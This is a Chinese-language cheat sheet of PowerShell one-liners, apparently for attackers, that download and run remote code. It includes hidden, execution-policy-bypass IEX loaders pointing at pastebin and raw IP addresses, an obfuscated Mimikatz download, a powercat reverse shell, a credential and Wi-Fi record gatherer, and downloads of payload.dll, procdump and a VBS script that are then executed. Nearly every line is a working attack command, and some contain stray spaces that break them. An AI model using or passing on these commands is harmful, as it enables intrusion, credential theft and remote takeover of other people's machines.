#### 1、文本文件下载

```sh
# 执行远程文本文件内容
powershell -c "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://pastebin.com/raw/M676F14U')"
```

```sh
# -nop        PowerShell控制台不加载当前用户的配置文件。
# -w hidden   隐藏执行窗口
# -c          将文本当作代码执行
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://139.155.49.43:8088/a'))"
```

```sh
# -ep bypass  不阻止任何操作，并且没有任何警告或提示。
powershell.exe -ep bypass -command "&'.\ps2exe.ps1' -inputFile 'd.ps1' -outputFile 'd.exe'"
```

```sh
powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://139.155.49.43/shell.ps1');shell.ps1";
```

```sh
#FTP访问、共享连接、putty连接、驱动、应用程序、hosts 文件、进程、无线网络记录 
powershell iex(new-object net.webclient).downloadstring('http://47.104.255.11:8000/Get-Information.ps1');Get-I nformation
```

```sh
# 混淆
powershell -c "('IEX '+'(Ne'+'w-O'+'bject Ne'+'t.W'+'ebClien'+'t).Do'+'wnloadS'+'trin'+ 'g'+'('+'1vchttp://'+'10.0.0'+'.213:8000/'+'Inv'+'oke-Mimik'+'a'+'tz.'+'ps11v'+'c)'+ ';'+'I'+'nvoke-Mimika'+'tz').REplaCE('1vc',[STRing][CHAR]39)|IeX"
```

```sh
# 下载脚本并执行命令可选参数
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubus ercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.168.81.229 -p 1 234 -e cmd"
```

#### 2、下载二进制文件

```sh
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://139.155.49.43:8000/payload.dll',\"c:\payload.dll\")"
```

```sh
powershell (new-object System.Net.WebClient).DownloadFile('http://10.0.0.213:8000/procdump64.exe','procdump64.exe');start procdump64.exe
```

```sh
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://139.155.49.43:8000/3.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
